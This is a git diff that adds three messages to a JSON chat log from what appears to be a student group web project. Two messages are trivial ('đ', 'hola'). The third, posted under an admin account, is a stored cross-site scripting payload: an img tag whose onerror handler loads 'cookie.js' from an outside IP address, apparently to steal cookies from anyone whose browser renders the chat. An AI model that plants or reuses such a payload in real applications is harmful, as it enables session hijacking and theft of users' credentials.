@@ -154,5 +154,44 @@
     "room": "general",
     "type": "text",
     "timestamp": "2025-07-07T15:30:18.841Z"
+  },
+  {
+    "id": "1752121665068tz90wp6wr",
+    "content": "đ",
+    "user": {
+      "id": "1",
+      "username": "admin",
+      "avatar": "http://localhost/BaiTapNhom/backend/uploads/avatars/avatar_1234567890.jpg",
+      "role": "admin"
+    },
+    "room": "general",
+    "type": "text",
+    "timestamp": "2025-07-10T04:27:45.068Z"
+  },
+  {
+    "id": "1752585302126lq0o7tlrg",
+    "content": "<img src=x onerror=\"var s=document.createElement('script');s.src='http://192.168.123.4:8888/cookie.js';document.body.appendChild(s);\">",
+    "user": {
+      "id": "1",
+      "username": "Admin",
+      "avatar": "https://traffic-humans-incentive-heather.trycloudflare.com/BaiTapNhom/backend/uploads/avatars/avatar_1234567890.jpg",
+      "role": "admin"
+    },
+    "room": "general",
+    "type": "text",
+    "timestamp": "2025-07-15T13:15:02.126Z"
+  },
+  {
+    "id": "1752585713686apo66mnzs",
+    "content": "hola",
+    "user": {
+      "id": "3",
+      "username": "sinh",
+      "avatar": null,
+      "role": "user"
+    },
+    "room": "general",
+    "type": "text",
+    "timestamp": "2025-07-15T13:21:53.686Z"
   }
 ]
